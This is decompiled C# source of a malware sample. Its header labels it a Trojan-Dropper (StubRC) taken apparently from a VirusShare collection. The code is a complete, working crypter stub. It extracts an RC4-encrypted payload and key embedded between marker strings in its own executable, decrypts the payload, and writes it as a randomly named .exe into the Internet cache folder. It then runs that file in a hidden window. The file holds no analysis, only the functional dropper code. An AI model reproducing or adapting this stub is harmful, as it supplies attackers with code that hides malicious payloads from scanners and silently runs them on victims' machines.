// Decompiled with JetBrains decompiler
// Type: helloo.ModMain
// Assembly: hello, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 653FDFBF-6D0E-4C78-B965-869FB72085B1
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Trojan-Dropper.MSIL.StubRC.bf-631999fcd772b48bb2b8a22236bd4d5b96f9fc7a74b3895890409bdae880cffb.exe

using helloo.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace helloo
{
  [StandardModule]
  internal sealed class ModMain
  {
    [STAThread]
    public static void main()
    {
      FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
      string str1 = Strings.Space((int) FileSystem.LOF(1));
      FileSystem.FileGet(1, ref str1);
      FileSystem.FileClose(1);
      ref string local1 = ref str1;
      string str2 = "<@@ENCEXE@@>";
      ref string local2 = ref str2;
      string str3 = "<@@/ENCEXE@@>";
      ref string local3 = ref str3;
      int num1 = 0;
      ref int local4 = ref num1;
      string between1 = ModMain.GetBetween(ref local1, ref local2, ref local3, ref local4);
      ref string local5 = ref str1;
      string str4 = "<@@PASS@@>";
      ref string local6 = ref str4;
      string str5 = "<@@/PASS@@>";
      ref string local7 = ref str5;
      int num2 = 0;
      ref int local8 = ref num2;
      string between2 = ModMain.GetBetween(ref local5, ref local6, ref local7, ref local8);
      string str6 = ModMain.rc4(between1, between2);
      string str7 = Environment.GetFolderPath(Environment.SpecialFolder.InternetCache) + "\\" + Conversions.ToString(ModMain.Number(10000, 99999)) + ".exe";
      if (MyProject.Computer.FileSystem.FileExists(str7))
        FileSystem.Kill(str7);
      FileSystem.FileOpen(1, str7, OpenMode.Binary, OpenAccess.ReadWrite);
      FileSystem.FilePut(1, str6, -1L, false);
      FileSystem.FileClose(1);
      Interaction.Shell(str7, AppWinStyle.Hide);
    }

    private static string GetBetween(
      ref string strSource,
      ref string strStart,
      ref string strEnd,
      ref int startPos = 0)
    {
      int length = strStart.Length;
      string between = string.Empty;
      int num1 = strSource.IndexOf(strStart, startPos);
      int num2 = strSource.IndexOf(strEnd, num1 + length);
      if (num1 != -1 && num2 != -1)
        between = strSource.Substring(num1 + length, num2 - (num1 + length));
      return between;
    }

    private static int Number(int min, int max)
    {
      int num1;
      int num2;
      int num3;
      try
      {
        ProjectData.ClearProjectError();
        num1 = 2;
        num2 = new Random().Next(min, max);
        goto label_7;
label_2:
        num3 = -1;
        switch (num1)
        {
          case 2:
            ProjectData.EndApp();
            goto label_7;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num3 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_2;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_7:
      int num4 = num2;
      if (num3 == 0)
        return num4;
      ProjectData.ClearProjectError();
      return num4;
    }

    private static string rc4(string message, string password)
    {
      int index1 = 0;
      int index2 = 0;
      StringBuilder stringBuilder = new StringBuilder();
      string empty = string.Empty;
      int[] numArray1 = new int[257];
      int[] numArray2 = new int[257];
      int length = password.Length;
      int location1 = 0;
      while (location1 <= (int) byte.MaxValue)
      {
        char String = password.Substring(location1 % length, 1).ToCharArray()[0];
        numArray2[location1] = Strings.Asc(String);
        numArray1[location1] = location1;
        Math.Max(Interlocked.Increment(ref location1), location1 - 1);
      }
      int index3 = 0;
      int location2 = 0;
      while (location2 <= (int) byte.MaxValue)
      {
        index3 = (index3 + numArray1[location2] + numArray2[location2]) % 256;
        int num = numArray1[location2];
        numArray1[location2] = numArray1[index3];
        numArray1[index3] = num;
        Math.Max(Interlocked.Increment(ref location2), location2 - 1);
      }
      location1 = 1;
      while (location1 <= message.Length)
      {
        index1 = (index1 + 1) % 256;
        index2 = (index2 + numArray1[index1]) % 256;
        int num1 = numArray1[index1];
        numArray1[index1] = numArray1[index2];
        numArray1[index2] = num1;
        int num2 = numArray1[(numArray1[index1] + numArray1[index2]) % 256];
        int CharCode = Strings.Asc(message.Substring(location1 - 1, 1).ToCharArray()[0]) ^ num2;
        stringBuilder.Append(Strings.Chr(CharCode));
        Math.Max(Interlocked.Increment(ref location1), location1 - 1);
      }
      string str = stringBuilder.ToString();
      stringBuilder.Length = 0;
      return str;
    }
  }
}
